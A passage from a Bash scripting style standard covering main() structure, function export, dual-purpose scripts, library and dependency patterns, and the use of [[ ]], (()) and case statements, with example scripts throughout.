declare -i result
result=$(main 5)

if ((result == 10)); then
  echo "PASS"
else
  echo "FAIL: Expected 10, got ${result@Q}"
fi
```

**Summary:**

- **Use main() for scripts >200 lines** - provides organization and testability
- **Single entry point** - all execution flows through main()
- **Place main() at end** - define helpers first, main last
- **Always call with "$@"** - `main "$@"` to pass all arguments
- **Parse arguments in main** - keep argument handling in one place
- **Make locals readonly** - after parsing, make option variables readonly
- **Return appropriate code** - 0 for success, non-zero for errors
- **Consider sourcing** - use `[[ "${BASH_SOURCE[0]}" == "${0}" ]]` for testability
- **Organize sections** - messaging, documentation, helpers, business logic, main

**Key principle:** The main() function is the orchestrator - it doesn't do the work, it coordinates it. All heavy lifting should be in helper functions. Main's job is to parse arguments, validate input, call the right functions in the right order, and return an appropriate exit code. This separation makes scripts testable, debuggable, and maintainable.


---


**Rule: BCS0404**

## Function Export
```bash
# Export functions when needed by subshells
grep() { /usr/bin/grep "$@"; }
find() { /usr/bin/find "$@"; }
declare -fx grep find
```


---


**Rule: BCS0405**

## Production Script Optimization
Once a script is mature and ready for production:
- Remove unused utility functions (e.g., if `yn()`, `decp()`, `trim()`, `s()` are not used)
- Remove unused global variables (e.g., `SCRIPT_DIR`, `PROMPT`, `DEBUG` if not referenced)
- Remove unused messaging functions that your script doesn't call
- Keep only the functions and variables your script actually needs
- This reduces script size, improves clarity, and eliminates maintenance burden

Example: A simple script may only need `error()` and `die()`, not the full messaging suite.


---


**Rule: BCS0406**

## Dual-Purpose Scripts

**Rule: BCS0606** (Elevated from BCS010201)

Scripts that can be both executed directly and sourced as libraries.

---

#### Rationale

Dual-purpose scripts provide:
- Reusable functions without code duplication
- Direct execution for standalone use
- Library sourcing for integration
- Testing flexibility (source functions, run tests)

---

#### Basic Pattern

```bash
#!/usr/bin/env bash
# my-lib.sh - Dual-purpose library/script

# Define functions first (before any set -e)
my_function() {
  local -- arg=$1
  echo "Processing ${arg@Q}"
}
declare -fx my_function

# Check if sourced or executed
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Everything below runs only when executed directly
set -euo pipefail
shopt -s inherit_errexit shift_verbose

# Script metadata
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_NAME=${SCRIPT_PATH##*/}

main() {
  my_function "$@"
}

main "$@"
#fin
```

#### With Idempotent Initialization

```bash
#!/usr/bin/env bash
# Prevent double-initialization when sourced

[[ -v MY_LIB_VERSION ]] || {
  declare -rx MY_LIB_VERSION=1.0.0
  declare -rx MY_LIB_PATH=$(realpath -e -- "${BASH_SOURCE[0]}")
}

# Functions defined here...
my_func() { :; }
declare -fx my_func

# Source-mode exit
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Execution mode
set -euo pipefail
main() { my_func "$@"; }
main "$@"
#fin
```

#### Why set -e Comes After Check

The `set -e` must come AFTER the sourced check because:

1. When sourced, parent script controls error handling
2. `return 0` with `set -e` active could cause issues
3. Library code should not impose error handling on caller

```bash
# ✗ Wrong - set -e before source check
set -euo pipefail
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0  # Risky

# ✓ Correct - set -e after source check
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0
set -euo pipefail
```

---

#### Using Dual-Purpose Scripts

```bash
# As executable
./my-lib.sh arg1 arg2

# As library (source for functions)
source ./my-lib.sh
my_function "value"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - functions not exported
my_func() { :; }
# Cannot be called from subshells after sourcing

# ✓ Correct - export functions
my_func() { :; }
declare -fx my_func
```

---

**See Also:** BCS0607 (Library Patterns), BCS0604 (Function Export)

**Full implementation:** See `examples/exemplar-code/internetip/internetip`


---


**Rule: BCS0407**

## Library Patterns

**Rule: BCS0607**

Patterns for creating reusable Bash libraries.

---

#### Rationale

Well-designed libraries provide:
- Code reuse across multiple scripts
- Consistent behavior and interface
- Easier testing and maintenance
- Namespace isolation

---

#### Pure Function Library

```bash
#!/usr/bin/env bash
# lib-validation.sh - Validation function library
#
# Usage: source lib-validation.sh

# Prevent execution
[[ "${BASH_SOURCE[0]}" != "$0" ]] || {
  >&2 echo 'Error: This file must be sourced, not executed'
  exit 1
}

# Library version
declare -rx LIB_VALIDATION_VERSION=1.0.0

# Validation functions
valid_ip4() {
  local -- ip=$1
  [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] || return 1
  local -a octets
  IFS='.' read -ra octets <<< "$ip"
  for octet in "${octets[@]}"; do
    ((octet <= 255)) || return 1
  done
  return 0
}
declare -fx valid_ip4

valid_email() {
  [[ $1 =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$ ]]
}
declare -fx valid_email

#fin
```

#### Library with Configuration

```bash
#!/usr/bin/env bash
# lib-config.sh - Configuration management library

[[ "${BASH_SOURCE[0]}" != "$0" ]] || return 1

# Configurable defaults (can be overridden before sourcing)
: "${CONFIG_DIR:=/etc/myapp}"
: "${CONFIG_FILE:="$CONFIG_DIR"/config}"

load_config() {
  [[ -f "$CONFIG_FILE" ]] || return 1
  source "$CONFIG_FILE"
}
declare -fx load_config

get_config() {
  local -- key=$1 default=${2:-}
  local -- value
  value=$(grep "^${key}=" "$CONFIG_FILE" 2>/dev/null | cut -d= -f2-)
  echo "${value:-$default}"
}
declare -fx get_config

#fin
```

#### Namespace Pattern

```bash
#!/usr/bin/env bash
# lib-myapp.sh - Namespaced library

[[ "${BASH_SOURCE[0]}" != "$0" ]] || exit 1

# All functions prefixed with namespace
myapp_init() { :; }
myapp_cleanup() { :; }
myapp_process() { :; }

declare -fx myapp_init myapp_cleanup myapp_process

#fin
```

#### Sourcing Libraries

```bash
# Source with path resolution
SCRIPT_DIR=${BASH_SOURCE[0]%/*}
source "$SCRIPT_DIR"/lib-validation.sh

# Source with existence check
lib_path='/usr/local/lib/myapp/lib-utils.sh'
[[ -f "$lib_path" ]] && source "$lib_path" || die 1 "Missing library ${lib_path@Q}"

# Source multiple libraries
for lib in "$LIB_DIR"/*.sh; do
  [[ -f "$lib" ]] && source "$lib" ||:
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - library has side effects on source
source lib.sh  # Immediately modifies global state

# ✓ Correct - library only defines functions
source lib.sh  # Only defines functions
lib_init       # Explicit initialization call
```

---

**See Also:** BCS0606 (Dual-Purpose Scripts), BCS0608 (Dependency Management)

**Full implementation:** See `examples/exemplar-code/internetip/validip`


---


**Rule: BCS0408**

## Dependency Management

**Rule: BCS0608**

Checking and managing external dependencies in Bash scripts.

---

#### Rationale

Proper dependency management:
- Provides clear error messages for missing tools
- Enables graceful degradation
- Documents script requirements
- Supports portability checking

---

#### Basic Dependency Check

```bash
# Check single command
command -v curl >/dev/null || die 1 'curl is required but not installed'

# Check multiple commands
for cmd in curl jq awk; do
  command -v "$cmd" >/dev/null || die 1 "Required ${cmd@Q}"
done
```

#### Dependency Check Function

```bash
check_dependencies() {
  local -a missing=()
  local -- cmd

  for cmd in "$@"; do
    command -v "$cmd" >/dev/null || missing+=("$cmd")
  done

  if ((${#missing[@]})); then
    error "Missing dependencies: ${missing[*]}"
    info 'Install with: sudo apt install ...'
    return 1
  fi
}

# Usage
check_dependencies curl jq sqlite3 || exit 1
```

#### Optional Dependencies

```bash
# Check and set availability flag
declare -i HAS_JQ=0
command -v jq >/dev/null && HAS_JQ=1 ||:

# Use with fallback
if ((HAS_JQ)); then
  result=$(echo "$json" | jq -r '.field')
else
  result=$(echo "$json" | grep -oP '"field":\s*"\K[^"]+')
fi
```

#### Version Checking

```bash
check_bash_version() {
  local -i major=${BASH_VERSINFO[0]}
  local -i minor=${BASH_VERSINFO[1]}

  if ((major < 5 || (major == 5 && minor < 2))); then
    die 1 "Requires Bash 5.2+, found $BASH_VERSION"
  fi
}

check_tool_version() {
  local -- tool=$1 min_version=$2
  local -- current_version

  current_version=$("$tool" --version 2>&1 | head -1 | grep -oE '[0-9]+\.[0-9]+')

  if [[ "$(printf '%s\n' "$min_version" "$current_version" | sort -V | head -1)" != "$min_version" ]]; then
    die 1 "$tool version $min_version+ required, found $current_version"
  fi
}
```

#### Lazy Loading

```bash
# Initialize expensive resources only when needed
declare -- SQLITE_DB=''

get_db() {
  if [[ -z "$SQLITE_DB" ]]; then
    command -v sqlite3 >/dev/null || die 1 'sqlite3 required'
    SQLITE_DB=$(mktemp)
    sqlite3 "$SQLITE_DB" 'CREATE TABLE cache (key TEXT, value TEXT)'
  fi
  echo "$SQLITE_DB"
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - using which (not POSIX, unreliable)
which curl >/dev/null

# ✓ Correct - use command -v (POSIX compliant)
command -v curl >/dev/null
```

```bash
# ✗ Wrong - silent failure on missing dependency
curl "$url"  # Cryptic error if curl missing

# ✓ Correct - explicit check with helpful message
command -v curl >/dev/null || die 1 'curl required: apt install curl'
curl "$url"
```

---

**See Also:** BCS0607 (Library Patterns)


---


**Rule: BCS0500**

# Control Flow

This section establishes patterns for conditionals, loops, case statements, and arithmetic operations. It mandates using `[[ ]]` over `[ ]` for test expressions, `(())` for arithmetic conditionals, and covers both compact case statement formats and expanded formats for complex logic. Critical guidance includes preferring process substitution (`< <(command)`) over pipes to while loops to avoid subshell variable persistence issues, and using safe arithmetic patterns: `i+=1` instead of `((i+=1))`, or `((i++))` which returns the original value and fails with `set -e` when i=0.


---


**Rule: BCS0501**

## Conditionals

**Use `[[ ]]` for string/file tests, `(())` for arithmetic:**

```bash
# String and file tests - use [[ ]]
[[ -d "$path" ]] && echo 'Directory exists' ||:
[[ -f "$file" ]] || die 1 "File not found ${file@Q}"
[[ "$status" == success ]] && continue ||:

# Arithmetic tests - use (())
((VERBOSE==0)) || echo 'Verbose mode'
((var > 5)) || return 1
((count >= MAX_RETRIES)) && die 1 'Too many retries' ||:

# Complex conditionals - combine both
if [[ -n "$var" ]] && ((count)); then
  process_data
fi

# Short-circuit evaluation
[[ -f "$file" ]] && source "$file"
((VERBOSE)) || return 0
```

**Rationale for `[[ ]]` over `[ ]`:**

1. **No word splitting or glob expansion** on variables
2. **Pattern matching** with `==` and `=~` operators
3. **Logical operators** `&&` and `||` work inside (no `-a` / `-o` needed)
4. **No need to quote variables** in most cases (but still recommended)
5. **More operators**: `<`, `>` for string comparison (lexicographic)

**Comparison of `[[ ]]` vs `[ ]`:**

```bash
var='two words'

# ✗ [ ] requires quotes or fails
[ $var = 'two words' ]  # ERROR: too many arguments
[ "$var" = 'two words' ]  # Works but fragile

# ✓ [[ ]] handles unquoted variables (but quote anyway)
[[ $var == 'two words' ]]  # Works even without quotes
[[ "$var" == 'two words' ]]  # Recommended - quote anyway

# Pattern matching (only works in [[ ]])
[[ "$file" == *.txt ]] && echo "Text file"
[[ "$input" =~ ^[0-9]+$ ]] && echo "Number"

# Logical operators inside [[ ]]
[[ -f "$file" && -r "$file" ]] && cat "$file" ||:

# vs [ ] requires separate tests
[ -f "$file" ] && [ -r "$file" ] && cat "$file" ||:
```

**Arithmetic conditionals - use `(())`:**

```bash
declare -i count=0
: ...

# ✓ Correct - natural C-style syntax
if ((count)); then
  echo "Count: $count"
fi

((i >= MAX)) && die 1 'Limit exceeded' ||:

# ✗ Wrong - using [[ ]] for arithmetic (verbose, error-prone)
if [[ "$count" -gt 0 ]]; then  # Unnecessary
  echo "Count: $count"
fi

# Comparison operators in (())
((a > b))   # Greater than
((a >= b))  # Greater or equal
((a < b))   # Less than
((a <= b))  # Less or equal
((a == b))  # Equal
((a != b))  # Not equal
```

**Pattern matching examples:**

```bash
# Glob pattern matching
[[ "$filename" == *.@(jpg|png|gif) ]] && process_image "$filename" ||:

# Regular expression matching
if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
  echo 'Valid email'
else
  die 22 "Invalid email ${email@Q}"
fi

# Case-insensitive matching (bash 3.2+)
shopt -s nocasematch
[[ "$input" == yes ]] && echo "Affirmative"  # Matches YES, Yes, yes
shopt -u nocasematch
```

**Short-circuit evaluation:**

```bash
# Execute second command only if first succeeds
[[ -f "$config" ]] && source "$config" ||:
((DEBUG)) && set -x ||:

# Execute second command only if first fails
[[ -d "$dir" ]] || mkdir -p "$dir"
((count)) || die 1 'No items to process'

# Chaining multiple conditions
[[ -f "$file" ]] && [[ -r "$file" ]] && cat "$file"
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using old [ ] syntax
if [ -f "$file" ]; then  # Use [[ ]] instead
  echo 'Found'
fi

# ✗ Wrong - using -a and -o in [ ]
[ -f "$file" -a -r "$file" ]  # Deprecated, fragile

# ✓ Correct - use [[ ]] with && and ||
[[ -f "$file" && -r "$file" ]]

# ✗ Wrong - string comparison with [ ] unquoted
[ $var = 'value' ]  # Breaks if var contains spaces

# ✓ Correct - use [[ ]] (still quote for clarity)
[[ "$var" == "value" ]]

# ✗ Wrong - arithmetic with [[ ]] using -gt/-lt
[[ "$count" -gt 10 ]]  # Verbose, less readable

# ✓ Correct - use (()) for arithmetic
((count > 10))
```

**Common file test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-e file` | File exists |
| `-f file` | Regular file |
| `-d dir` | Directory |
| `-r file` | Readable |
| `-w file` | Writable |
| `-x file` | Executable |
| `-s file` | Not empty (size > 0) |
| `-L link` | Symbolic link |
| `file1 -nt file2` | file1 newer than file2 |
| `file1 -ot file2` | file1 older than file2 |

**Common string test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-z "$str"` | String is empty (zero length) |
| `-n "$str"` | String is not empty |
| `"$a" == "$b"` | Strings are equal |
| `"$a" != "$b"` | Strings are not equal |
| `"$a" < "$b"` | Lexicographic less than |
| `"$a" > "$b"` | Lexicographic greater than |
| `"$str" =~ regex` | String matches regex |
| `"$str" == pattern` | String matches glob pattern |


---


**Rule: BCS0502**

## Case Statements

**Use `case` statements for multi-way branching based on pattern matching. Case statements are more readable and efficient than long `if/elif` chains when testing a single value against multiple patterns. Choose compact format for simple single-action cases, and expanded format for multi-line logic. Always align actions consistently and use appropriate pattern matching syntax.**

**Rationale:**

- **Readability**: Case statements are clearer than long if/elif chains for pattern-based branching
- **Pattern Matching**: Native support for wildcards, alternation, and character classes
- **Performance**: Case is faster than multiple if/elif tests - single evaluation of the test value
- **Maintainability**: Easy to add, remove, or reorder cases without restructuring logic
- **Argument Parsing**: Perfect for command-line option processing with multiple flags
- **Exhaustive Matching**: Default `*)` case ensures all possibilities are handled
- **Visual Organization**: Column alignment makes structure immediately obvious

**When to use case vs if/elif:**

```bash
# ✓ Use case when - testing single variable against multiple values
case "$action" in
  start)   start_service ;;
  stop)    stop_service ;;
  restart) restart_service ;;
  status)  show_status ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✓ Use case when - pattern matching needed
case "$filename" in
  *.txt) process_text_file ;;
  *.pdf) process_pdf_file ;;
  *.md)  process_markdown_file ;;
  *)     die 22 'Unsupported file type' ;;
esac

# ✓ Use case when - parsing command-line arguments
case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -h|--help)    show_help; exit 0 ;;
  -*)           die 22 "Invalid option ${1@Q}" ;;
  *)            FILENAME=$1 ;;
esac

# ✗ Use if/elif when - testing different variables
if [[ ! -f "$file" ]]; then
  die 2 "File not found ${file@Q}"
elif [[ ! -r "$file" ]]; then
  die 1 "File not readable ${file@Q}"
elif [[ -z "$output" ]]; then
  die 22 'Output path required'
fi

# ✗ Use if/elif when - complex conditional logic
if [[ "$count" -gt 100 && "$verbose" -eq 1 ]]; then
  info 'Processing large batch in verbose mode'
elif [[ "$count" -gt 100 ]]; then
  info 'Processing large batch'
fi

# ✗ Use if/elif when - testing numeric ranges
if ((value < 0)); then
  error='negative'
elif ((value == 0)); then
  error='zero'
elif ((value <= 10)); then
  category='small'
else
  category='large'
fi
```

**Case expression quoting:**

The `case` expression doesn't require quoting. Word splitting doesn't apply in the case expression context:

```bash
# ✓ CORRECT - no quotes needed on case expression
case ${1:-} in
  --help) show_help ;;
esac

case $action in
  start|stop|restart) handle_service ;;
esac

# ✗ UNNECESSARY - quotes don't add value here
case "${1:-}" in
  --help) show_help ;;
esac
```

**Why quoting is unnecessary:**
- Case word undergoes pattern matching, not word splitting
- The expression is evaluated as a single unit regardless of quoting
- Omitting quotes reduces visual clutter
- Consistent with compact argument parsing patterns

**Note:** While quoting is harmless, the BCS style preference is to omit unnecessary quotes for cleaner code.

**Compact format:**

Use compact format when each case performs a single action or simple command.

**Guidelines:**
- All actions on same line as pattern
- Terminate with `;;` on same line
- Align `;;` at consistent column (typically 14-18)
- No blank lines between cases
- Perfect for argument parsing with simple flag setting

**Compact format example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i FORCE=0
declare -- OUTPUT_FILE=''
declare -a INPUT_FILES=()

# Compact case for simple argument parsing
while (($#)); do
  case $1 in
    -n|--dry-run) DRY_RUN=1 ;;
    -f|--force)   FORCE=1 ;;
    -V|--version) echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -o|--output)  noarg "$@"; shift; OUTPUT_FILE=$1 ;;
    -v|--verbose) VERBOSE+=1 ;;
    -q|--quiet)   VERBOSE=0 ;;
    -h|--help)    show_help; exit 0 ;;
    --)           shift; break ;;
    -*)           die 22 "Invalid option ${1@Q}" ;;
    *)            INPUT_FILES+=("$1") ;;
  esac
  shift
done

INPUT_FILES+=("$@")
readonly -- VERBOSE DRY_RUN FORCE OUTPUT_FILE
readonly -a INPUT_FILES

#fin
```

**Expanded format:**

Use expanded format when cases have multi-line actions, require comments, or perform complex operations.

**Guidelines:**
- Action starts on next line, indented
- Multiple statements aligned at consistent column
- Terminate with `;;` on separate line, aligned left
- Blank line after `;;` separates cases visually
- Comments within case branches are acceptable
- Column alignment typically at 14-18 characters

**Expanded format example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i INSTALL_BUILTIN=0
declare -i VERBOSE=0
declare -- PREFIX=/usr/local
declare -- BIN_DIR=''
declare -- LIB_DIR=''

# Expanded case for complex argument parsing
while (($#)); do
  case $1 in
    -b|--builtin)  INSTALL_BUILTIN=1
                   ((VERBOSE)) && info 'Builtin installation enabled' ||:
                   ;;

    -p|--prefix)   noarg "$@"
                   shift
                   PREFIX=$1
                   BIN_DIR="$PREFIX"/bin
                   LIB_DIR="$PREFIX"/lib/bash
                   ((VERBOSE)) && info "Prefix set to: $PREFIX" ||:
                   ;;

    -v|--verbose)  VERBOSE+=1
                   info 'Verbose mode enabled'
                   ;;

    -q|--quiet)    VERBOSE=0
                   info 'Verbose mode disabled'
                   ;;

    -V|--version)  echo "$SCRIPT_NAME $VERSION"
                   exit 0
                   ;;

    -h|--help)     show_help
                   exit 0
                   ;;

    --)            shift
                   break
                   ;;

    -[bpvqVh]*) #shellcheck disable=SC2046 #split up single options
                   set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
                   ;;

    -*)            error "Invalid option ${1@Q}"
                   show_help
                   exit 22
                   ;;

    *)             error "Unexpected argument ${1@Q}"
                   show_help;
                   exit 2
                   ;;
  esac
  shift
done

readonly -- INSTALL_BUILTIN VERBOSE PREFIX BIN_DIR LIB_DIR

#fin
```

**Pattern matching syntax:**

**1. Literal patterns:**

```bash
# Exact string match
case "$value" in
  start)    echo 'Starting...' ;;
  stop)     echo 'Stopping...' ;;
  restart)  echo 'Restarting...' ;;
esac

# Quote pattern if it contains special characters
case "$email" in
  'admin@example.com') echo 'Admin user' ;;
  'user@example.com')  echo 'Regular user' ;;
esac
```

**2. Wildcard patterns (globbing):**

```bash
# Star wildcard - matches any characters
case "$filename" in
  *.txt) echo 'Text file' ;;
  *.pdf) echo 'PDF file' ;;
  *.log) echo 'Log file' ;;
  *)     echo 'Unknown file type' ;;
esac

# Question mark wildcard - matches single character
case "$code" in
  ??)   echo 'Two-character code' ;;
  ???)  echo 'Three-character code' ;;
  *)    echo 'Other length' ;;
esac

# Prefix/suffix matching
case "$path" in
  /usr/*)  echo 'System path' ;;
  /home/*) echo 'Home directory' ;;
  /tmp/*)  echo 'Temporary path' ;;
  *)       echo 'Other path' ;;
esac
```

**3. Alternation (OR patterns):**

```bash
# Multiple patterns with |
case "$option" in
  -h|--help|help) show_help; exit 0 ;;
  -v|--verbose|verbose) VERBOSE+=1 ;;
  -q|--quiet|quiet) VERBOSE=0 ;;
esac

# Combining alternation with wildcards
case "$filename" in
  *.txt|*.md|*.rst) echo 'Text document' ;;
  *.jpg|*.png|*.gif) echo 'Image file' ;;
  *.sh|*.bash) echo 'Shell script' ;;
esac
```

**4. Character classes:**

```bash
# With extglob enabled
shopt -s extglob

case "$input" in
  # ?(pattern) - zero or one occurrence
  test?(s)) echo 'test or tests' ;;

  # *(pattern) - zero or more occurrences
  file*(s).txt) echo 'file.txt, files.txt, filess.txt, etc.' ;;

  # +(pattern) - one or more occurrences
  log+([0-9]).txt) echo 'log followed by digits' ;;

  # @(pattern) - exactly one occurrence
  @(start|stop|restart)) echo 'Valid action' ;;

  # !(pattern) - anything except pattern
  !(*.tmp|*.bak)) echo 'Not a temp or backup file' ;;
esac

# Bracket expressions
case "$char" in
  [0-9]) echo 'Digit' ;;
  [a-z]) echo 'Lowercase letter' ;;
  [A-Z]) echo 'Uppercase letter' ;;
  [!a-zA-Z0-9]) echo 'Special character' ;;
esac
```

**Complete argument parsing example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i FORCE=0
declare -- OUTPUT_DIR=''
declare -- CONFIG_FILE="$SCRIPT_DIR"/config.conf
declare -a INPUT_FILES=()

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ▲" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Documentation Functions
# ============================================================================

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Process files

Process files with various options.

Usage: $SCRIPT_NAME [OPTIONS] FILE...

Options:
  -n, --dry-run          Show what would be done without doing it
  -f, --force            Force overwrite of existing files
  -q, --quiet            Suppress non-error output
  -o, --output DIR       Output directory
  -c, --config FILE      Configuration file
  -v, --verbose          Enable verbose output
  -q, --quiet            Disable verbose output
  -V, --version          Show version information
  -h, --help             Show this help message

Arguments:
  FILE...                Input files to process

Examples:
  $SCRIPT_NAME file.txt
  $SCRIPT_NAME -vo /tmp file1.txt file2.txt
  $SCRIPT_NAME -nv --output /backup *.txt
HELP
}

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# ============================================================================
# Business Logic
# ============================================================================

process_file() {
  local -- file=$1

  if [[ ! -f "$file" ]]; then
    error "File not found ${file@Q}"
    return 2
  fi

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would process ${file@Q}"
  else
    info "Processing ${file@Q}"
    # Process file logic here
  fi

  return 0
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      -n|--dry-run)     DRY_RUN=1
                        ;;

      -f|--force)       FORCE=1
                        ;;

      -o|--output)      noarg "$@"
                        shift
                        OUTPUT_DIR=$1
                        ;;

      -c|--config)      noarg "$@"
                        shift
                        CONFIG_FILE=$1
                        ;;

      -v|--verbose)     VERBOSE+=1
                        info 'Verbose mode enabled'
                        ;;

      -q|--quiet)       VERBOSE=0
                        info 'Verbose mode disabled'
                        ;;

      -V|--version)     echo "$SCRIPT_NAME $VERSION"
                        return 0
                        ;;

      -h|--help)        show_help
                        return 0
                        ;;

      -[nfocvqVh]*) #shellcheck disable=SC2046 #split up single options
                        set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
                        ;;

      --)               shift
                        break
                        ;;

      -*)               die 22 "Invalid option ${1@Q}"
                        ;;

      *)                INPUT_FILES+=("$1")
                        ;;
    esac
    shift
  done

  # Collect remaining arguments after --
  INPUT_FILES+=("$@")

  # Make parsed values readonly
  readonly -- VERBOSE DRY_RUN FORCE OUTPUT_DIR CONFIG_FILE
  readonly -a INPUT_FILES

  # Validate arguments
  if [[ ${#INPUT_FILES[@]} -eq 0 ]]; then
    error 'No input files specified'
    show_help
    return 2
  fi

  if [[ -n "$OUTPUT_DIR" && ! -d "$OUTPUT_DIR" ]]; then
    if ((FORCE)); then
      info "Creating output directory ${OUTPUT_DIR@Q}"
      mkdir -p "$OUTPUT_DIR"
    else
      die 2 "Output directory not found: ${OUTPUT_DIR@Q} (use -f to create)"
    fi
  fi

  if [[ ! -f "$CONFIG_FILE" ]]; then
    warn "Config file not found ${CONFIG_FILE@Q} (using defaults)"
  fi

  # Display configuration
  if ((VERBOSE)); then
    info "$SCRIPT_NAME $VERSION"
    info "Input files: ${#INPUT_FILES[@]}"
    [[ -z "$OUTPUT_DIR" ]] || info "Output: $OUTPUT_DIR"
    ((DRY_RUN==0)) || info '[DRY-RUN] Mode enabled'
  fi

  # Process files
  local -- file
  local -i success_count=0
  local -i error_count=0

  for file in "${INPUT_FILES[@]}"; do
    if process_file "$file"; then
      success_count+=1
    else
      error_count+=1
    fi
  done

  # Report results
  if ((VERBOSE)); then
    success "Processed: $success_count files"
    ((error_count)) && warn "Errors: $error_count" ||:
  fi

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Script Invocation
# ============================================================================

main "$@"
#fin
```

**File type routing example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Route files based on extension
process_file_by_type() {
  local -- file=$1
  local -- filename=${file##*/}

  case "$filename" in
    *.txt|*.md|*.rst)
      info "Processing text document ${file@Q}"
      process_text "$file"
      ;;

    *.jpg|*.jpeg|*.png|*.gif)
      info "Processing image ${file@Q}"
      process_image "$file"
      ;;

    *.pdf)
      info "Processing PDF ${file@Q}"
      process_pdf "$file"
      ;;

    *.sh|*.bash)
      info "Processing shell script ${file@Q}"
      validate_script "$file"
      ;;

    *.json)
      info "Processing JSON ${file@Q}"
      validate_json "$file"
      ;;

    *.xml)
      info "Processing XML ${file@Q}"
      validate_xml "$file"
      ;;

    .*)
      warn "Skipping hidden file ${file@Q}"
      return 0
      ;;

    *.tmp|*.bak|*~)
      warn "Skipping temporary file ${file@Q}"
      return 0
      ;;

    *)
      error "Unknown file type ${file@Q}"
      return 1
      ;;
  esac
}

process_text() {
  local -- file=$1
  # Text processing logic
}

process_image() {
  local -- file=$1
  # Image processing logic
}

process_pdf() {
  local -- file=$1
  # PDF processing logic
}

validate_script() {
  local -- file=$1
  shellcheck "$file"
}

validate_json() {
  local -- file=$1
  jq empty "$file"
}

validate_xml() {
  local -- file=$1
  xmllint --noout "$file"
}

main() {
  local -a files=("$@")

  ((${#files[@]})) || die 22 'No files specified'

  local -- file
  for file in "${files[@]}"; do
    process_file_by_type "$file"
  done
}

main "$@"
#fin
```

**Action routing example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Service control script
SERVICE_NAME=myapp
PID_FILE=/var/run/"$SERVICE_NAME".pid

start_service() {
  if [[ -f "$PID_FILE" ]]; then
    warn "Service already running (PID: $(cat "$PID_FILE"))"
    return 0
  fi

  info "Starting $SERVICE_NAME..."
  # Start service logic
  success "$SERVICE_NAME started"
}

stop_service() {
  if [[ ! -f "$PID_FILE" ]]; then
    warn 'Service not running'
    return 0
  fi

  local -i pid
  pid=$(cat "$PID_FILE")
  info "Stopping $SERVICE_NAME (PID: $pid)..."
  kill "$pid"
  rm -f "$PID_FILE"
  success "$SERVICE_NAME stopped"
}

restart_service() {
  info "Restarting $SERVICE_NAME..."
  stop_service
  sleep 1
  start_service
}

status_service() {
  if [[ -f "$PID_FILE" ]]; then
    local -i pid
